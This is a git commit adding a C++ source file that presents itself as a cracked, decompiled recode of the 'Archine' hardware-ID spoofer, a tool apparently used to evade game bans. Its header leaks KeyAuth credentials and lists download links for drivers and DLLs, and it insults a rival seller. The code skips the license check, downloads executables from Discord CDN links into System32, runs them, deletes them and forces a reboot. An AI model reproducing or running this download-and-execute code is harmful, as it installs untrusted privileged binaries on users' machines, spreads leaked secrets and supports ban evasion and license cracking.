ae4fe2e34e6e840d6433d31c5854336eec9bbbe2
0xCODEX-RE <89404423+0xCODEX-RE@users.noreply.github.com>
2021-08-23 20:43:44 +0530

    Add files via upload

---
+++ ArchineFullyRecodedFromDecompilation/ArchineFullyRecodedFromDecompilation.cpp
@@ -0,0 +1,143 @@
+/*
+* 
+* RECODED AND CRACKED BY CODEX
+* ARCHINE IS PASTED AND WILL ALWAYS BE PASTED!
+* Mr. Semtex is a skid, everything he sold is pasted from public sources in the internet.
+* 
+* Stop buying archine kids, buy from https://wooferpro.com ;)
+* 
+* 
+*
+* [KeyAuth Details]
+*
+* Application Name: YuutaBuuta
+* Owner ID: 6w2vhbfph5
+* App Secret: 3df0e063dd0cc289a3334f4cacfe072a87f62e28ce53dbadd434fbfdb630cd3b
+* Version: 213
+*
+* ------------------------------------------------------------------------------------------------
+*
+* [KeyAuth Variables + Links + Sources]
+*
+* CH4tpcBev9 = C:\ProgramData\SoftwareDistribution\Serials.exe
+* BTCisntgoodnow = C:\\Windows\\System32\\accessibility.dll			https://anonfiles.com/7fB97fD6u9/accessibility_dll (VOLUMEID)
+* ETHisworst = C:\\Windows\\System32\\amifldrv64.sys				LAPTOPS(https://anonfiles.com/X19270D7ud/amifldrv64_sys)(AFUWINx64)  PC(https://anonfiles.com/v4A979Dcu2/amifldrv64_sys)(AMIDEWIN64)
+* wooferdestroyed = C:\\Windows\\System32\\ifsutipx.exe				LAPTOPS(https://anonfiles.com/7bA17eDau8/ifsutipx_exe)(AFUWINx64)    PC(https://anonfiles.com/NdAe71Dbuc/ifsutipx_exe)(AMIDEWIN64)
+* Iamfucked = C:\\Windows\\winhlp64.dll								LAPTOPS(https://anonfiles.com/t5C17eD9uf/winhlp64_dll)(https://anonfiles.com/XaC87aDau7/winhlp64_Source_bat) PC(https://anonfiles.com/5aC571D0ue/winhlp64_dll)(https://anonfiles.com/f7D87eDau1/winhlp64_Source_bat)
+* fallen = C:\\Archine.rom											Basically gotten from ifsutipx.exe C:\Archine.rom /o
+* Scammedbro = C:\\Windows\\ntelidcx.dll							https://anonfiles.com/5eD974Dbue/ntelidcx_dll (https://anonfiles.com/ReFf7eD1u6/ntelidcx_Source_bat)
+* Mamisgay = C:\\Windows\\AppVLicense.dll							https://anonfiles.com/FaD47eD8u8/AppVLicense_dll (https://anonfiles.com/JeD179D9u5/AppVLicense_Source_bat)
+*
+* ------------------------------------------------------------------------------------------------
+*
+* [Decompiled Source]
+*
+* https://anonfiles.com/N6728cD6uf/ArchineWinMain_html
+* 
+* ------------------------------------------------------------------------------------------------
+* 
+* [Built Binary]
+* 
+* https://anonfiles.com/DcJ885D8u0/ArchineFullyRecodedFromDecompilation_exe
+* 
+*/
+
+#include <windows.h>
+#include <iostream>
+
+#pragma comment(lib, "urlmon.lib")
+
+int main()
+{
+	const char CharacterSet[] = "jklmnopqrstuv2119359OPQRSTUVWXYZ1234567890";
+	std::string RandomTitle;
+
+	// Not even initializing the rand function to get seed via srand, pure 1337 moment.
+	for (int i = 0; i != 2; i++)
+		RandomTitle += CharacterSet[rand() % 70];
+
+	SetConsoleTitleA(RandomTitle.c_str());
+	system("color 04");
+
+	std::cout << "\n Fetching Data";
+	//KeyAuth->Init
+	Sleep(2000);
+	system("cls");
+
+	std::cout << "\n ________________________________________________________________________________________";
+	std::cout << "\n|     ___     _____                               ___   _____                _           |";
+	std::cout << "\n|     / |     /    )        /     ,              /   )  /    )             /  `          |";
+	std::cout << "\n|    /__|    /___ /   __   /__     ___   ___    /__    /____/  __    __   /__  ___   )_  |";
+	std::cout << "\n|   /   |   /    |  /   ' /   ) / /   ) /___)      /  /      /   / /   / /    /___) /  ) |";
+	std::cout << "\n| _/    |_ /     | (___  /   / / /   / (____  (___/ _/      /___/ /___/ /    (____ /     |";
+	std::cout << "\n|________________________________________________________________________________________|";
+	std::cout << "\n                           [V4.1]               PASTED BY: MR.Semtex  | CRACKED BY: CODEX";
+
+	std::cout << "\n\n [+] Resellers (Dety#7777)\n";
+	std::cout << "\n [+] [MOTHERBOARD MANUFACTER NAME]\n";
+	std::cout << "\n\n\n\n [+] Insert key here: ";
+
+	std::string Key;
+	std::cin >> Key;
+
+	//KeyAuth License
+	Sleep(1000);
+
+	std::cout << "\n\n logged in";
+	system("cls");
+	system("color 04");
+
+	std::cout << "\n ________________________________________________________________________________________";
+	std::cout << "\n|     ___     _____                               ___   _____                _           |";
+	std::cout << "\n|     / |     /    )        /     ,              /   )  /    )             /  `          |";
+	std::cout << "\n|    /__|    /___ /   __   /__     ___   ___    /__    /____/  __    __   /__  ___   )_  |";
+	std::cout << "\n|   /   |   /    |  /   ' /   ) / /   ) /___)      /  /      /   / /   / /    /___) /  ) |";
+	std::cout << "\n| _/    |_ /     | (___  /   / / /   / (____  (___/ _/      /___/ /___/ /    (____ /     |";
+	std::cout << "\n|________________________________________________________________________________________|";
+	std::cout << "\n                           [V4.1]               PASTED BY: MR.Semtex  | CRACKED BY: CODEX";
+
+	std::cout << "\n\n [#] Spoofing - Hold tight, this might take a while";
+
+
+	// All keyauth file downloads have been replaced with static links, in case the idiot paster decides to delete them.
+
+	URLDownloadToFileA(0, "https://cdn.discordapp.com/attachments/879371915989483533/879372716086546593/accessibility.dll", "C:\\Windows\\System32\\accessibility.dll", 0, 0);
+	URLDownloadToFileA(0, "https://cdn.discordapp.com/attachments/879371915989483533/879373137253400607/amifldrv64.sys", "C:\\Windows\\System32\\amifldrv64.sys", 0, 0);
+	URLDownloadToFileA(0, "https://cdn.discordapp.com/attachments/879371915989483533/879373368699273276/ifsutipx.exe", "C:\\Windows\\System32\\ifsutipx.exe", 0, 0);
+	URLDownloadToFileA(0, "https://cdn.discordapp.com/attachments/879371915989483533/879373584676573184/winhlp64.exe", "C:\\Windows\\winhlp64.dll", 0, 0);
+	URLDownloadToFileA(0, "https://cdn.discordapp.com/attachments/879371915989483533/879373584676573184/winhlp64.exe", "C:\\Windows\\winhlp64.dll", 0, 0);
+
+	std::cout << "\n [#] Doing the job, Don't Panic if it freeze here";
+	Sleep(1500);
+
+	system("C:\\Windows\\winhlp64.dll");
+	Sleep(5000);
+
+	remove("C:\\Windows\\System32\\accessibility.dll");
+	remove("C:\\Windows\\System32\\amifldrv64.sys");
+	remove("C:\\Windows\\System32\\ifsutipx.exe");
+	remove("C:\\Windows\\winhlp64.dll");
+	Sleep(3000);
+
+	
+	std::cout << "\n [#] Reading values";
+
+
+	URLDownloadToFileA(0, "https://cdn.discordapp.com/attachments/879371915989483533/879375624068804668/ntelidcx.exe", "C:\\Windows\\ntelidcx.dll", 0, 0);
+	Sleep(1000);
+	system("C:\\Windows\\ntelidcx.dll");
+	Sleep(10000);
+	remove("C:\\Windows\\ntelidcx.dll");
+	Sleep(1000);
+
+	std::cout << "\n [#] Your Spoofed Now";
+
+	URLDownloadToFileA(0, "https://cdn.discordapp.com/attachments/879371915989483533/879378667120263208/AppVLicense.dll", "C:\\Windows\\AppVLicense.dll", 0, 0);
+	Sleep(1000);
+	system("shutdown /r /t 30");
+	system("C:\\Windows\\AppVLicense.dll");
+	Sleep(1000);
+	remove("C:\\Windows\\AppVLicense.dll");
+
+	return 0;
+}
